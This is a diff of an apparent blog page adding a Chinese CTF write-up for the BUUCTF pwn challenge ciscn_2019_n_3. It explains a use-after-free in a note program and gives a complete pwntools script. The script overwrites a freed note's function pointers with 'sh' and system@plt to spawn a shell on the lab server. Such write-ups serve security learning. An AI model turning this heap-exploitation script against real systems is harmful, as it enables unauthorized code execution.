@@ -97,8 +97,14 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/out.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/poprdi.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/check.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/example.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/new.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/del.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/free.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1597045678391.png">
 <meta property="article:published_time" content="2020-07-20T01:15:56.000Z">
-<meta property="article:modified_time" content="2020-07-20T02:57:52.983Z">
+<meta property="article:modified_time" content="2020-08-10T07:48:00.594Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/buu/2.png">
@@ -345,6 +351,32 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag.png" alt="flag"></p>
+<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>check</p>
+<p><img src="/image/buu/check.png" alt="check"></p>
+<p>开启了NX和Canary</p>
+<p>main函数是一个菜单</p>
+<p><img src="/image/buu/example.png" alt="example"></p>
+<p>new函数</p>
+<p><img src="/image/buu/new.png" alt="new"></p>
+<p>records[v2]储存堆块指针，堆块大小为0xC。</p>
+<p>*v3 为函数rec_int_print地址；</p>
+<p>*(v3+4)为函数rec_int_free地址；</p>
+<p>*(v3+8)为输入值value，整数直接存储，字符串则储存地址。</p>
+<p>del函数</p>
+<p><img src="/image/buu/del.png" alt="del"></p>
+<p><img src="/image/buu/free.png" alt="free"></p>
+<p>调用(*(records[v0]+4))就是调用rec_int_free，参数为records[v0]。dump函数类似。</p>
+<p>可以看到这里free(ptr)后没有将指针置零。</p>
+<p>思路：先申请两个存整数的note1和note2，然后再free掉。</p>
+<p>此时，fastbin中为note2–&gt;note1</p>
+<p>然后，再申请note3，存储字符串，长度为0xC。那么就会先分配note2的空间给note3，再分配note1的空间给字符串。</p>
+<p>这时，我们输入的字符串实际上是在修改note1。</p>
+<p>将note1的*v3和 *(v3+4)改成’sh\x00\x00’+p32(system_plt);再del note1就可以getshell</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29068</span>)</span><br><span class="line"><span class="comment">#p=process('./ciscn_2019_n_3')</span></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_n_3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(idx,type,value,length=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index &gt; '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Type &gt; '</span>)</span><br><span class="line">	p.sendline(str(type))</span><br><span class="line">	<span class="keyword">if</span> type == <span class="number">1</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Value &gt; '</span>)</span><br><span class="line">		p.sendline(str(value))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Length &gt; '</span>)</span><br><span class="line">		p.sendline(str(length))</span><br><span class="line">		p.recvuntil(<span class="string">'Value &gt; '</span>)</span><br><span class="line">		<span class="keyword">if</span> length == <span class="number">8</span>:</span><br><span class="line">			p.send(value)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			p.sendline(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'CNote &gt; '</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index &gt; '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">1</span>,<span class="number">1</span>,<span class="number">233</span>)</span><br><span class="line">newnote(<span class="number">2</span>,<span class="number">1</span>,<span class="number">233</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">'sh\x00\x00'</span>+p32(elf.plt[<span class="string">'system'</span>]),<span class="number">0xc</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/buu/flag-1597045678391.png" alt="flag"></p>
 
       
     </div>
@@ -499,7 +531,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-text">bjdctf_2020_babyrop2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-text">bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-3"><span class="nav-text">ciscn_2019_n_3</span></a></li></ol></div>
             
 
           </div>
